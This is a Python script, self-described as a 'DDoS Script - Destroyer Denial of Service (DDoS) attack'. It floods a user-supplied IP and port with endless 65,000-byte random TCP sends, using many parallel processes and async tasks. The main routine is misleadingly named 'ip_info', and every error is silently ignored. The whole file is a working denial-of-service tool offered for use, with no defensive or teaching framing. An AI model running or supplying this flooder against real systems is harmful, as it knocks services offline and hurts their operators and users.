import socket
import random
import asyncio
import multiprocessing
import argparse

# Function to run IP info gathering
def run_ip_info(ip_address, port, num_processes, num_threads_per_process):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(ip_info(ip_address, port, num_processes, num_threads_per_process))
    except Exception as e:
        # Handle exceptions if needed, or just pass
        pass

# Asynchronous function to gather IP info
async def ip_info(ip_address, port, num_processes, num_threads_per_process):
    try:
        target = socket.gethostbyname(ip_address)
    except socket.gaierror:
        print(f"Hostname could not be resolved:")
        return

    try:
        tasks = [send_packets(target, port, num_threads_per_process) for _ in range(num_processes)]
        await asyncio.gather(*tasks)
    except Exception as e:
        # Handle exceptions if needed, or just pass
        pass

# Asynchronous function to send packets
async def send_packets(target, port, num_threads):
    try:
        await asyncio.gather(
            *[send_packet(target, port) for _ in range(num_threads)]
        )
    except Exception as e:
        # Handle exceptions if needed, or just pass
        pass

# Asynchronous function to send an individual packet
async def send_packet(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.setblocking(False)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        bytes_data = random._urandom(65000)

        while True:
            sock.send(bytes_data)
    except Exception as e:
        # Handle exceptions if needed, or just pass
        pass

if __name__ == '__main__':
    # Command-line arguments parsing
    parser = argparse.ArgumentParser(description='DDoS Script - Destroyer Denial of Service (DDoS) attack')
    parser.add_argument('-ip', required=True, help='Target IP address')
    parser.add_argument('-p', required=True, type=int, help='Target port number')
    parser.add_argument('-pr', default=20, type=int, help='Number of processes to run in parallel')
    parser.add_argument('-t', default=10, type=int, help='Number of threads per process')
    try:
        args = parser.parse_args()
        ip_address = args.ip
        port = args.p
        num_processes = args.pr
        num_threads_per_process = args.t
        processes = []

        try:
            for _ in range(num_processes):
                process = multiprocessing.Process(target=run_ip_info, args=(ip_address, port, num_processes, num_threads_per_process))
                processes.append(process)
                process.start()
        except Exception as e:
            # Handle exceptions if needed, or just pass
            pass

        try:
            for process in processes:
                process.join()
        except Exception as e:
            # Handle exceptions if needed, or just pass
            pass
    except Exception as e:
        # Handle exceptions if needed, or just pass
        pass
